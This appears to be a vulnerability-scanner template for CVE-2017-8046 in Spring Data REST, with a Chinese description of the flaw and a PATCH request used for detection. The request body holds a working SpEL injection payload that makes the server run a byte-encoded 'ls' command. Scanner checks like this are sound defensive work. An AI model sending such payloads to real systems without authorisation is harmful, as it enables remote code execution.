expression: r0()
id: CVE-2017-8046
info:
  author: sm
  description: "SpringDataREST\u662F\u4E00\u4E2A\u6784\u5EFA\u5728SpringData\u4E4B\
    \u4E0A\uFF0C\u4E3A\u4E86\u5E2E\u52A9\u5F00\u53D1\u8005\u66F4\u52A0\u5BB9\u6613\
    \u5730\u5F00\u53D1REST\u98CE\u683C\u7684Web\u670D\u52A1\u3002\u5728RESTAPI\u7684\
    Patch\u65B9\u6CD5\u4E2D\uFF08\u5B9E\u73B0RFC6902\uFF09\uFF0Cpath\u7684\u503C\u88AB\
    \u4F20\u5165setValue\uFF0C\u5BFC\u81F4\u6267\u884C\u4E86SpEL\u8868\u8FBE\u5F0F\
    \uFF0C\u89E6\u53D1\u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u3002\n"
  name: Spring Data Rest RCE
  reference:
  - https://tanzu.vmware.com/security/cve-2017-8046
  - https://mp.weixin.qq.com/s/q2CNe9sscjlBXVaVUMCGNA
  severity: critical
rules:
  r0:
    expression: response.status == 400 && response.body.bcontains(b'cause') && response.body.bcontains(b'message')
    request:
      body: '[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new
        java.lang.String(new byte[]{108,115}))/lastname", "value": "ry" }]

        '
      headers:
        Content-Type: application/json-patch+json
      method: PATCH
      path: /customers/1
